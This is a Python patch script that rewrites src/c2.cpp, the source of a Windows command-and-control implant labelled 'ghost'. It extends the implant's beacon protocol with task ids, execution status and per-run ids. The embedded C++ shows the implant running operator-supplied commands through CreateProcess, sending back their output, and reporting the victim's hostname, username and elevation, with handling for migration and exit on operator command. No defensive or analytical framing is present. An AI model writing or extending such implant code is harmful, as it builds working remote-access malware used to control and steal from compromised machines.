# Part 2: SendResult, ExecuteCommand status, run id, BeaconLoop wiring.
src_path = 'src/c2.cpp'
s = open(src_path, encoding='utf-8').read()
Q, BS, NL, EM = chr(34), chr(92), chr(10), chr(8212)

def rep(old, new, name):
    global s
    if old not in s:
        if new in s:
            print('skip (applied):', name)
            return
        raise AssertionError('NOT FOUND: ' + name)
    assert s.count(old) == 1, 'NOT UNIQUE: ' + name
    s = s.replace(old, new, 1)
    print('ok:', name)

# SendResult: signature + body line
anchor = 'BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {'
body_marker = '    std::string body = "{'
rep(anchor,
    'BOOL SendResult(const std::wstring& sessionId, const std::wstring& tid,\n'
    '                const std::wstring& status, const std::wstring& output) {', 'SendResult sig')

si = s.find('BOOL SendResult(const std::wstring& sessionId, const std::wstring& tid,')
bi = s.find(body_marker, si)
assert bi > si, 'body line not found'
le = s.find(NL, bi)
old_line = s[bi:le]
assert 'output' in old_line, old_line
tid_frag = (Q + BS + Q + 'tid' + BS + Q + ':' + BS + Q + Q + ' + JsonEscape(WStringToUTF8(tid)) + ')
stat_frag = (Q + BS + Q + 'status' + BS + Q + ':' + BS + Q + Q + ' + JsonEscape(WStringToUTF8(status)) + ')
n_frag = (Q + BS + Q + 'n' + BS + Q + ':')
new_line = ('    std::string body = "{' + BS + Q + 'session' + BS + Q + ':' + BS + Q + Q +
            ' + sid + ' + Q + ',' + BS + Q + ':' + BS + Q + Q +
            ' + tid_frag_placeholder' + Q + ',' + BS + Q + ':' + BS + Q + Q +
            ' + out + ' + Q + '}' + Q + ';')
# Simpler: rebuild the whole line from primitives
new_line = ('    std::string body = "{'
            + BS + Q + 'session' + BS + Q + ':' + BS + Q + Q + ' + sid + '
            + Q + ',' + BS + Q + 'tid' + BS + Q + ':' + BS + Q + Q
            + ' + JsonEscape(WStringToUTF8(tid)) + '
            + Q + ',' + BS + Q + 'status' + BS + Q + ':' + BS + Q + Q
            + ' + JsonEscape(WStringToUTF8(status)) + '
            + Q + ',' + BS + Q + 'n' + BS + Q + ':' + Q
            + ' + std::to_string(++g_TxN) + '
            + Q + ',' + BS + Q + 'output' + BS + Q + ':' + BS + Q + Q
            + ' + out + ' + Q + '}' + Q + ';')
s = s[:bi] + new_line + s[le:]
print('ok: SendResult body')

# ExecuteCommand: signature + status sets
rep('std::wstring ExecuteCommand(const std::wstring& cmd) {\n'
    '    std::string cmdStr = WStringToUTF8(cmd);',
    'std::wstring ExecuteCommand(const std::wstring& cmd, std::wstring& statusOut) {\n'
    '    statusOut = L"ok";\n'
    '    std::string cmdStr = WStringToUTF8(cmd);', 'exec sig')
rep('    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return L"[error: pipe failed]";',
    '    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) { statusOut = L"error"; return L"[error: pipe failed]"; }',
    'exec pipe')
rep('            CloseHandle(hRead); CloseHandle(hWrite);\n'
    '            return L"[error: CreateProcess failed]";',
    '            CloseHandle(hRead); CloseHandle(hWrite);\n'
    '            statusOut = L"error";\n'
    '            return L"[error: CreateProcess failed]";', 'exec spawn')
rep('    if (WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS) == WAIT_TIMEOUT) {\n'
    '        TerminateProcess(pi.hProcess, 1);\n'
    '    }',
    '    if (WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS) == WAIT_TIMEOUT) {\n'
    '        TerminateProcess(pi.hProcess, 1);\n'
    '        statusOut = L"timeout";\n'
    '    }', 'exec timeout')

# BeaconLoop: run id generation
rep('    EcdhInit();   // fresh ephemeral keypair per run ' + EM + ' key set by first beacon' + chr(39) + 's handshake\n'
    '    DebugLog(L"Session: " + session.sessionId);',
    '    EcdhInit();   // fresh ephemeral keypair per run ' + EM + ' key set by first beacon' + chr(39) + 's handshake\n'
    '    {   // per-run id (8 hex) - lets the operator tell implant runs apart\n'
    '        unsigned char rb[4] = {};\n'
    '        BCryptGenRandom(nullptr, rb, 4, BCRYPT_USE_SYSTEM_PREFERRED_RNG);\n'
    '        wchar_t tmp[9];\n'
    '        swprintf_s(tmp, L"%02x%02x%02x%02x", rb[0], rb[1], rb[2], rb[3]);\n'
    '        g_RunId = tmp;\n'
    '    }\n'
    '    DebugLog(L"Session: " + session.sessionId + L" run=" + g_RunId);', 'run id')

# BeaconLoop: call site
rep('            std::wstring task;\n'
    '            BOOL ok = SendBeacon(session, task);',
    '            std::wstring task, tid, status = L"ok";\n'
    '            bool dup = false;\n'
    '            BOOL ok = SendBeacon(session, task, tid, dup);', 'loop call')

# hello / migrate / exit
rep('                SendResult(session.sessionId,\n'
    '                    L"[ghost] implant online' + BS + 'r' + BS + 'nhost: " + session.hostname +\n'
    '                    L"' + BS + 'r' + BS + 'nuser: " + session.username +\n'
    '                    L"' + BS + 'r' + BS + 'nelevated: " + (session.elevated ? L"yes" : L"no"));',
    '                SendResult(session.sessionId, L"", L"ok",\n'
    '                    L"[ghost] implant online' + BS + 'r' + BS + 'nhost: " + session.hostname +\n'
    '                    L"' + BS + 'r' + BS + 'nuser: " + session.username +\n'
    '                    L"' + BS + 'r' + BS + 'nrun: " + g_RunId +\n'
    '                    L"' + BS + 'r' + BS + 'nelevated: " + (session.elevated ? L"yes" : L"no"));', 'hello')
rep('SendResult(session.sessionId, L"[ghost] migration complete, exiting");',
    'SendResult(session.sessionId, L"", L"ok", L"[ghost] migration complete, exiting");', 'migrate')
rep('SendResult(session.sessionId, L"[ghost] exiting on operator command");',
    'SendResult(session.sessionId, L"", L"ok", L"[ghost] exiting on operator command");', 'exit')

# task execution block
rep('                DebugLog(L"Exec: " + task);\n'
    '                std::wstring result = ExecuteCommand(task);',
    '                DebugLog(L"Exec: " + task + L" tid=" + tid);\n'
    '                std::wstring result;\n'
    '                if (dup) {\n'
    '                    // Retried delivery of a task we already ran ' + EM + ' the result\n'
    '                    // went out with the previous run; complete it without re-executing.\n'
    '                    result = L"[duplicate task - result already delivered]";\n'
    '                } else {\n'
    '                    result = ExecuteCommand(task, status);\n'
    '                }', 'exec block')
rep('                SendResult(session.sessionId, result);',
    '                SendResult(session.sessionId, tid, status, result);', 'result call')

open(src_path, 'w', encoding='utf-8', newline='').write(s)
print('part 2 written - implant protocol v2 complete')
